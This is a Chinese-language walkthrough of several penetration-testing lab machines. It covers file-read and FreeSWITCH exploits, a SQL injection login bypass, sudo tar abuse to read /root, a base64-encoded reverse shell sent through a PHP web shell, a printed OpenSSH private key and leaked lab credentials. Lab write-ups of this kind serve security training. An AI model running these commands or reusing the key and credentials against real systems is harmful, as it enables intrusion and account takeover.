正确思路应该是本地创建密钥对，然后上传authorized_keys到靶机用户.ssh目录下

```
ssh-keygen
mv key.pub authorized_keys
ssh remi@192.168.164.231 -i key
```

![image-20250216232256195](./PG_linux.assets/image-20250216232256195.png)

拿到local

![image-20250216232400204](./PG_linux.assets/image-20250216232400204.png)

这时候想起来那四个私钥，不是用户`remi`的，说不定是root的，刚好有一个名字还叫root，直接用私钥连接会报`Too many authentication failures`，我开`-v`发现是服务器存储了多个私钥，相互干扰超过了最大可尝试次数，使用`IdentitiesOnly=yes`可以解决该问题

```
ssh root@127.0.0.1 -i root -o IdentitiesOnly=yes
```

拿到proof

![image-20250216234730967](./PG_linux.assets/image-20250216234730967.png)



## Clue

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.164.240
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-17 09:42 CST
Nmap scan report for 192.168.164.240
Host is up (0.0025s latency).
Not shown: 65529 filtered ports
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.39 - 3.2 (86%), Infomir MAG-250 set-top box (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-17T01:43:56
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.00 ms 192.168.45.1
2   1.99 ms 192.168.45.254
3   2.34 ms 192.168.251.1
4   2.42 ms 192.168.164.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.05 seconds
```

3000端口开了Cassandra Web，访问一下看看，稍等一会会显示出来如下界面，疑似数据库管理页面

![image-20250217094837767](./PG_linux.assets/image-20250217094837767.png)

大概搜了下这个

> Cassandra Web 结合了前沿的前端技术和可靠的后端服务，旨在简化Apache Cassandra数据库的管理和监控。它利用AngularJS构建响应式的用户界面，与基于Sinatra框架的HTTP API相结合，通过服务器发送事件(Server-Sent Events, SSE)实现实时交互，使得数据管理变得更加流畅和即时。

通过检索，先尝试了`CVE-2021-44521`能RCE的vul，失败，然后尝试了远程文件读取

![image-20250217100038620](./PG_linux.assets/image-20250217100038620.png)

成功

```
python3 49362.py 192.168.164.240 -p 3000 /etc/passwd
```

![image-20250217100054918](./PG_linux.assets/image-20250217100054918.png)

远程文件读取尝试读取了local，用户私钥，历史命令都无果后，看了hints（发现掉入兔子洞了

之前nmap扫描还有一个8021端口开放的freeswitch服务，检索漏洞并利用

![image-20250217102257359](./PG_linux.assets/image-20250217102257359.png)

![image-20250217102316283](./PG_linux.assets/image-20250217102316283.png)

直接连接会显示认证失败，应该是改了密码，刚刚不是找到了任意文件读取，问了一手GPT

![image-20250217102212407](./PG_linux.assets/image-20250217102212407.png)

在第二个配置文件读取到了密码

![image-20250217102237302](./PG_linux.assets/image-20250217102237302.png)

修改py文件的默认密码为：StrongClueConEight021

![image-20250217102408832](./PG_linux.assets/image-20250217102408832.png)

成功RCE

![image-20250217102432169](./PG_linux.assets/image-20250217102432169.png)

反弹shell，由于poc传入命令限制，不能过多使用`'`和`"`，使用base64

试了很多都不行，不知道是不是V*N的问题，直接读取local先交了

![image-20250217104822594](./PG_linux.assets/image-20250217104822594.png)

我很疑惑为什么只有3000端口可以弹，可能又是V*N的问题，也可能有防火墙，80端口我服务器占用没办法用

![image-20250217122449645](./PG_linux.assets/image-20250217122449645.png)

尝试suid提权

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

有sodu权限

![image-20250217122826223](./PG_linux.assets/image-20250217122826223.png)

有sudo权限，尝试更改用户密码

```
echo "freeswitch:12345" | chpasswd
```

![image-20250217123250352](./PG_linux.assets/image-20250217123250352.png)

失败了，想起之前有看到一个ssh凭证

![image-20250217123542535](./PG_linux.assets/image-20250217123542535.png)

利用远程文件读取查看一下

```
python3 49362.py 192.168.164.240 -p 3000 /home/cassie/id_rsa
```

![image-20250217123733446](./PG_linux.assets/image-20250217123733446.png)

是一个私钥文件

```
echo "python3 49362.py 192.168.164.240 -p 3000 /home/cassie/id_rsa" | bash > id_rsa
```

![image-20250217123829244](./PG_linux.assets/image-20250217123829244.png)

写入

```
cat <<EOF > ./id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
EOF

```

记得私钥的权限一定要是`600`

使用私钥连接用户cassie失败，尝试一手root

![image-20250217125231810](./PG_linux.assets/image-20250217125231810.png)

拿到proof

![image-20250217125556619](./PG_linux.assets/image-20250217125556619.png)



## Cockpit

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.164.10
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-19 10:13 CST
Nmap scan report for 192.168.164.10
Host is up (0.0030s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2025-02-19T02:13:51
|_Not valid after:  2125-01-26T02:13:51
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.80%T=SSL%I=7%D=2/19%Time=67B53E9D%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,E45,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:
SF:\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DN
SF:S-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<
SF:head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title
SF:>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
SF:xt/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\
SF:"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x
SF:20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fon
SF:t-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20A
SF:rial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20f
SF:ont-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20lin
SF:e-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20margin:\x200\x200\x2010px;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20@font-face\x20{\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20")%r(HTTPOptions,E45,"HTTP/1\.1\x20400\x20Bad
SF:\x20request\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransfer-
SF:Encoding:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-Poli
SF:cy:\x20no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\n\r\n29\r\n<
SF:!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\
SF:x20request\r\nd08\r\n</title>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Co
SF:ntent-Type\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20\x20\
SF:x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initi
SF:al-scale=1\.0\">\n\x20\x20\x20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDisplay\",\x20\"Open\x
SF:20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20line-height:\x201\.66666667;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f5f5;\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x20middle;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20300;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x200\x2010
SF:px;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0@font-face\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/19%OT=22%CT=1%CU=35782%PV=Y%DS=4%DC=T%G=Y%TM=67B53F2
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT     ADDRESS
1   2.75 ms 192.168.45.1
2   2.74 ms 192.168.45.254
3   3.56 ms 192.168.251.1
4   3.76 ms 192.168.164.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.74 seconds
```

开放了80http和9090https

![image-20250219103406092](./PG_linux.assets/image-20250219103406092.png)

dirsearch扫描目录发现login.php页面

![image-20250219104133214](./PG_linux.assets/image-20250219104133214.png)

尝试了弱口令和常规sql注入字符，发现注入点和闭合符号

![image-20250219104238003](./PG_linux.assets/image-20250219104238003.png)

使用账号：`admin%'#`，密码随便输成功登录进后台，后台找到两个凭证

![image-20250219104653594](./PG_linux.assets/image-20250219104653594.png)

账号/密码：

```
james/canttouchhhthiss@455152
cameron/thisscanttbetouchedd@455152
```

用凭证登录9090端口的UBUNTU UI成功

![image-20250219104807118](./PG_linux.assets/image-20250219104807118.png)

拿到local

![image-20250219104914942](./PG_linux.assets/image-20250219104914942.png)

上传并运行linpeas.sh

> `less -R file`可以将例如`linpeas.sh > linpeas.out`的输出带颜色的渲染出来，避免输出结果过多，终端无法完全显示

```
linpeas.sh > linpeas.out
less -R linpeas.out
```

提权思路

![image-20250219110231922](./PG_linux.assets/image-20250219110231922.png)

尝试后发现没有make命令，用`nft_object UAF`发现没有gcc命令

使用`sudo -l`命令，发现后面有*符号，意味着后面跟任何路径都可以打包

![image-20250219111810480](./PG_linux.assets/image-20250219111810480.png)

直接打包`/root`

```
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz /root
```

![image-20250219112548060](./PG_linux.assets/image-20250219112548060.png)

然后解压

```
tar -xzvf backup.tar.gz
```

![image-20250219112812172](./PG_linux.assets/image-20250219112812172.png)

拿到proof

![image-20250219112741580](./PG_linux.assets/image-20250219112741580.png)



## Codo

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.164.23
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-19 11:30 CST
Nmap scan report for 192.168.164.23
Host is up (0.0033s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: All topics | CODOLOGIC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.39 - 3.2 (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.61 ms 192.168.45.1
2   2.59 ms 192.168.45.254
3   2.83 ms 192.168.251.1
4   3.22 ms 192.168.164.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.68 seconds
```

除了ssh只有80的http，访问一下看看

![image-20250219115912552](./PG_linux.assets/image-20250219115912552.png)

```
searchsploit codoforum
```

![image-20250219115858129](./PG_linux.assets/image-20250219115858129.png)

有一个RCE漏洞，复制下来尝试发现需要账号密码，直接一手admin/admin成功进入系统

![image-20250219123249685](./PG_linux.assets/image-20250219123249685.png)

脚本输出上传失败了，手动试试

> ```
> [-] Something went wrong, please try uploading the shell manually(admin panel > global settings > change forum logo > upload and access from http://192.168.164.23//sites/default/assets/img/attachments/[file.php])
> ```

成功

![image-20250219123303354](./PG_linux.assets/image-20250219123303354.png)

反弹shell

```
shell.php?shell=system('echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMjIvMzAwMCAwPiYx" |base64 -d | bash');
```

![image-20250219123651289](./PG_linux.assets/image-20250219123651289.png)

SUID看了下提不了，上传执行linpeas.sh看

在PHP配置文件找到一个密码，尝试切换用户

![image-20250219125014132](./PG_linux.assets/image-20250219125014132.png)

尝试切换普通用户失败

![image-20250219125338727](./PG_linux.assets/image-20250219125338727.png)

切换root秒了

![image-20250219125351366](./PG_linux.assets/image-20250219125351366.png)



## Crane

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.146
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-22 18:44 CST
Nmap scan report for 192.168.216.146
Host is up (0.0077s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.80%I=7%D=2/22%Time=67B9AABA%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/22%OT=22%CT=1%CU=30644%PV=Y%DS=4%DC=T%G=Y%TM=67B9AAC
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT     ADDRESS
1   4.66 ms 192.168.45.1
2   4.66 ms 192.168.45.254
3   4.74 ms 192.168.251.1
4   4.91 ms 192.168.216.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.61 seconds
```

开放了80的http端口，而且有robots.txt泄露

![image-20250222184907199](./PG_linux.assets/image-20250222184907199.png)

搜索exp，有一个能够RCE的漏洞，但是需要认证

